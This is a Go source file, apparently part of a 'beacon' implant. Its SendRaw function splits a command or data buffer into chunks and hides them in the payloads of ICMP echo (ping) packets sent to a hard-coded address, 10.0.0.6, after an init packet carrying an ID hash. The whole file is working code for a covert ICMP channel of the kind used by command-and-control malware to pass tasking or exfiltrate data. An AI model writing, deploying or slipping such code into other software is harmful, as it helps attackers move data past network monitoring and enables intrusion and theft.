package sendicmp

import (
	h "beacon/helper"
	"log"
	"net"
	"os"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

func splitArray(bytesArr []byte, size int) [][]byte {
	arrLen := len(bytesArr)
	if arrLen <= size {
		return [][]byte{bytesArr}
	}

	var result [][]byte
	for i := 0; i < arrLen; i += size {
		end := i + size
		if end > arrLen {
			end = arrLen
		}
		result = append(result, bytesArr[i:end])
	}

	return result
}

func shoot(conn *icmp.PacketConn, dst net.Addr, init icmp.Message) error {
	//marshall and send off
	payload, err := init.Marshal(nil)
	if err != nil {
		return err
	}
	// Send the ICMP packet
	_, err = conn.WriteTo(payload, dst)
	if err != nil {
		return err
	}
	return nil
}

func SendRaw(cmd []byte, seqNum uint16) {
	// Destination IP address
	ipAddrStr := "10.0.0.6" // Replace with the desired destination IP

	// Resolve the IP address
	ipAddr, err := net.ResolveIPAddr("ip4", ipAddrStr)
	if err != nil {
		log.Fatal(err)
	}
	// Create a network connection
	conn, err := icmp.ListenPacket("ip4:icmp", "10.0.0.6")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	cmds := splitArray(cmd, 256)
	//first send an icmp message with the unique seq number, id struct, num messages
	id := h.GenHash()
	init := icmp.Message{
		Type: ipv4.ICMPTypeEcho,
		Code: 0,
		Body: &icmp.Echo{
			ID:   os.Getpid() & 0xffff,
			Seq:  int(seqNum),
			Data: id,
		},
	}
	err = shoot(conn, ipAddr, init)
	if err != nil {
		log.Fatal(err.Error())
	}

	for n, cmd := range cmds {
		echo := icmp.Message{
			Type: ipv4.ICMPTypeEcho,
			Code: 0,
			Body: &icmp.Echo{
				ID:   os.Getpid() & 0xffff,
				Seq:  int(seqNum) + 1 + n,
				Data: append(id, cmd...),
			},
		}
		err = shoot(conn, ipAddr, echo)
		if err != nil {
			log.Fatal(err.Error())
		}

	}

	log.Println("ICMP packet sent successfully!")
}
